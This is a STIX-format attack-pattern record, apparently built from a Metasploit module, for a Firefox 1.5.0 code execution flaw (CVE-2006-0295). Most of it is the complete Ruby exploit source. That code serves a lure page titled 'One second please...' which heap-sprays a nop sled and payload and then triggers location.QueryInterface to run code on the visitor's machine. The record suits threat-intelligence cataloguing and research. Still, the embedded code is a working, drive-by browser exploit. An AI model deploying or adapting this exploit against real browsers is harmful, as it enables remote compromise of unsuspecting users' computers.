{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d25bafa-0ca3-4280-bd46-a644ab1ee870",
    "created": "2024-08-14T17:06:19.451329Z",
    "modified": "2024-08-14T17:06:19.451333Z",
    "name": "Firefox location.QueryInterface() Code Execution",
    "description": " This module exploits a code execution vulnerability in the Mozilla Firefox browser. To reliably exploit this vulnerability, we need to fill almost a gigabyte of memory with our nop sled and payload. This module has been tested on OS X 10.3 with the stock Firefox 1.5.0 package.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_queryinterface.rb",
            "external_id": "firefox_queryinterface.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0295"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/mfsa2006-04.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox location.QueryInterface() Code Execution',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in the Mozilla\n        Firefox browser. To reliably exploit this vulnerability, we need to fill\n        almost a gigabyte of memory with our nop sled and payload. This module has\n        been tested on OS X 10.3 with the stock Firefox 1.5.0 package.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>  ['hdm'],\n      'References'     =>\n        [\n          ['CVE', '2006-0295'],\n          ['OSVDB', '22893'],\n          ['BID', '16476'],\n          ['URL', 'http://www.mozilla.org/security/announce/mfsa2006-04.html'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000 + (rand(256).to_i * 4),\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => %w{ osx linux },\n      'Targets'        =>\n        [\n          [ 'Firefox 1.5.0.0 Mac OS X',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC\n            }\n          ],\n\n          [ 'Firefox 1.5.0.0 Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2006-02-02'\n      ))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })\n    handler(cli)\n  end\n\n  def generate_html(payload)\n\n    enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n    enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))\n\n    return <<-EOF\n<html>\n<head>\n<title>One second please...</title>\n<script language=\"javascript\">\n\nfunction BodyOnLoad() {\n  h = FillHeap();\n  location.QueryInterface(eval(\"Components.interfaces.nsIClassInfo\"));\n};\n\nfunction FillHeap() {\n  // Filler\n  var m = \"\";\n  var h = \"\";\n  var a = 0;\n\n  // Nop sled\n  for(a=0; a<(1024*256); a++)\n    m += unescape(\"#{enc_nops}\");\n\n  // Payload\n  m += unescape(\"#{enc_code}\");\n\n  // Repeat\n  for(a=0; a<1024; a++)\n    h += m;\n\n  // Return\n  return h;\n}\n</script>\n</head>\n<body onload=\"BodyOnLoad()\">\n</body>\n</html>\nEOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-02-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}